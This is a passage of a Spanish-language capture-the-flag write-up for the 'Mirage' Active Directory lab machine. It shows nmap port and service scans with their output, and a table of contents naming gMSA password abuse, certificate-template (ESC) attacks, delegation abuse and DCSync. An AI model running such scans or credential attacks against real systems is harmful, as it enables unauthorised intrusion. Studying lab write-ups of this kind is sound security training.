+                    <a href="#restricci%c3%b3n-logonhours-del-usuario-javiermmarshall" aria-label="Restricción LogonHours del usuario javier.mmarshall">Restricción LogonHours del usuario javier.mmarshall</a></li></ul>
+                </li>
+                <li>
+                    <a href="#as-javiermmarshall" aria-label="As javier.mmarshall">As javier.mmarshall</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-permisos-readgmsapassword---nxc" aria-label="Abusando de permisos ReadGMSAPassword - Nxc">Abusando de permisos ReadGMSAPassword - Nxc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-esc2-y-esc3---certipy-failed" aria-label="Abusando de ESC2 y ESC3 - Certipy (FAILED)">Abusando de ESC2 y ESC3 - Certipy (FAILED)</a></li>
+                <li>
+                    <a href="#esc10-weak-certificate-mapping-for-schannel-authentication" aria-label="ESC10: Weak Certificate Mapping for Schannel Authentication">ESC10: Weak Certificate Mapping for Schannel Authentication</a></li>
+                <li>
+                    <a href="#otorgando-resource-based-constrained-delegation-a-mirage-service" aria-label="Otorgando Resource-Based Constrained Delegation a Mirage-Service">Otorgando Resource-Based Constrained Delegation a Mirage-Service</a></li>
+                <li>
+                    <a href="#dcsync-attack---secretdumpspy" aria-label="DCSYNC Attack - Secretdumps.py">DCSYNC Attack - Secretdumps.py</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="mirage_machine" loading="lazy" src="/img/mirage/mirage_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.78 -oG ports
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-21 16:49 +0200
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 16:49
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.78 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 111/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 2049/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51863/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51920/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 47001/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51885/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 49667/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51856/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51864/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51879/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 49669/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 49664/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 4222/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 49666/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51913/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 51913/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 4222/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 49665/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 57944/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.78
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 16:49, 15.62s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.78
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.035s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-07-21 16:49:25 CEST <span class="k">for</span> 16s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65439</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, <span class="m">66</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">2049/tcp  open  nfs              syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">4222/tcp  open  vrml-multi-use   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">47001/tcp open  winrm            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49665/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49666/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49669/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51856/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51863/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51864/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51879/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51885/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51913/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">51920/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">57944/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 15.67 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">86448</span> <span class="o">(</span>3.804MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">66503</span> <span class="o">(</span>2.660MB<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados: 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">53</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">88</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">111</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">135</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">139</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">389</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">445</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">464</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">593</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">636</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">2049</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3268</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3269</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">4222</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">5985</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">9389</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">47001</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49664</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49665</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49666</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49667</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49669</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51856</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51863</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51864</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51879</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51885</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51913</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">51920</span> 
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">57944</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49669,51856,51863,51864,51879,51885,51913,51920,57944 10.10.11.78 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-21 16:51 +0200
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.78
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.11s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE         VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain          <span class="o">(</span>generic dns response: SERVFAIL<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS-SD-TCP: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _services
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _dns-sd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _udp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="nb">local</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec    Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-21 21:51:31Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind         2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rpcinfo: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   program version    port/proto  service
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp6  rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp6  rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3         2049/udp   nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3         2049/udp6  nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp   nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp6  nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/tcp   mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/tcp6  mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/udp   mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/udp6  mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/tcp   nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/tcp6  nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/udp   nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/udp6  nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           2049/tcp   status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           2049/tcp6  status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           2049/udp   status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>           2049/udp6  status
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap            Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: mirage.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2105-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: mirage.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2105-07-04T19:58:41
+</span></span><span class="line"><span class="cl">2049/tcp  open  nlockmgr        1-4 <span class="o">(</span>RPC <span class="c1">#100021)</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: mirage.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2105-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: mirage.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2105-07-04T19:58:41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">4222/tcp  open  vrml-multi-use?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     INFO <span class="o">{</span><span class="s2">&#34;server_id&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;server_name&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;2.11.3&#34;</span>,<span class="s2">&#34;proto&#34;</span>:1,<span class="s2">&#34;git_commit&#34;</span>:<span class="s2">&#34;a82cfda&#34;</span>,<span class="s2">&#34;go&#34;</span>:<span class="s2">&#34;go1.24.2&#34;</span>,<span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;0.0.0.0&#34;</span>,<span class="s2">&#34;port&#34;</span>:4222,<span class="s2">&#34;headers&#34;</span>:true,<span class="s2">&#34;auth_required&#34;</span>:true,<span class="s2">&#34;max_payload&#34;</span>:1048576,<span class="s2">&#34;jetstream&#34;</span>:true,<span class="s2">&#34;client_id&#34;</span>:2714,<span class="s2">&#34;client_ip&#34;</span>:<span class="s2">&#34;10.10.15.254&#34;</span>,<span class="s2">&#34;xkey&#34;</span>:<span class="s2">&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;</span><span class="o">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     -ERR <span class="s1">&#39;Authorization Violation&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     INFO <span class="o">{</span><span class="s2">&#34;server_id&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;server_name&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;2.11.3&#34;</span>,<span class="s2">&#34;proto&#34;</span>:1,<span class="s2">&#34;git_commit&#34;</span>:<span class="s2">&#34;a82cfda&#34;</span>,<span class="s2">&#34;go&#34;</span>:<span class="s2">&#34;go1.24.2&#34;</span>,<span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;0.0.0.0&#34;</span>,<span class="s2">&#34;port&#34;</span>:4222,<span class="s2">&#34;headers&#34;</span>:true,<span class="s2">&#34;auth_required&#34;</span>:true,<span class="s2">&#34;max_payload&#34;</span>:1048576,<span class="s2">&#34;jetstream&#34;</span>:true,<span class="s2">&#34;client_id&#34;</span>:2715,<span class="s2">&#34;client_ip&#34;</span>:<span class="s2">&#34;10.10.15.254&#34;</span>,<span class="s2">&#34;xkey&#34;</span>:<span class="s2">&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;</span><span class="o">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     -ERR <span class="s1">&#39;Authorization Violation&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     INFO <span class="o">{</span><span class="s2">&#34;server_id&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;server_name&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;2.11.3&#34;</span>,<span class="s2">&#34;proto&#34;</span>:1,<span class="s2">&#34;git_commit&#34;</span>:<span class="s2">&#34;a82cfda&#34;</span>,<span class="s2">&#34;go&#34;</span>:<span class="s2">&#34;go1.24.2&#34;</span>,<span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;0.0.0.0&#34;</span>,<span class="s2">&#34;port&#34;</span>:4222,<span class="s2">&#34;headers&#34;</span>:true,<span class="s2">&#34;auth_required&#34;</span>:true,<span class="s2">&#34;max_payload&#34;</span>:1048576,<span class="s2">&#34;jetstream&#34;</span>:true,<span class="s2">&#34;client_id&#34;</span>:2716,<span class="s2">&#34;client_ip&#34;</span>:<span class="s2">&#34;10.10.15.254&#34;</span>,<span class="s2">&#34;xkey&#34;</span>:<span class="s2">&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;</span><span class="o">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     -ERR <span class="s1">&#39;Authorization Violation&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     INFO <span class="o">{</span><span class="s2">&#34;server_id&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;server_name&#34;</span>:<span class="s2">&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;</span>,<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;2.11.3&#34;</span>,<span class="s2">&#34;proto&#34;</span>:1,<span class="s2">&#34;git_commit&#34;</span>:<span class="s2">&#34;a82cfda&#34;</span>,<span class="s2">&#34;go&#34;</span>:<span class="s2">&#34;go1.24.2&#34;</span>,<span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;0.0.0.0&#34;</span>,<span class="s2">&#34;port&#34;</span>:4222,<span class="s2">&#34;headers&#34;</span>:true,<span class="s2">&#34;auth_required&#34;</span>:true,<span class="s2">&#34;max_payload&#34;</span>:1048576,<span class="s2">&#34;jetstream&#34;</span>:true,<span class="s2">&#34;client_id&#34;</span>:2713,<span class="s2">&#34;client_ip&#34;</span>:<span class="s2">&#34;10.10.15.254&#34;</span>,<span class="s2">&#34;xkey&#34;</span>:<span class="s2">&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;</span><span class="o">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    -ERR <span class="s1">&#39;Authentication Timeout&#39;</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf          .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51856/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51863/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">51864/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51879/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51885/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51913/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51920/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">57944/tcp open  msrpc           Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+</span></span><span class="line"><span class="cl">SF-Port53-TCP:V<span class="o">=</span>7.97%I<span class="o">=</span>7%D<span class="o">=</span>7/21%Time<span class="o">=</span>687E540E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNS-
+</span></span><span class="line"><span class="cl">SF:SD-TCP,30,<span class="s2">&#34;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:_udp\x05local\0\0\x0c\0\x01&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+</span></span><span class="line"><span class="cl">SF-Port4222-TCP:V<span class="o">=</span>7.97%I<span class="o">=</span>7%D<span class="o">=</span>7/21%Time<span class="o">=</span>687E53FB%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
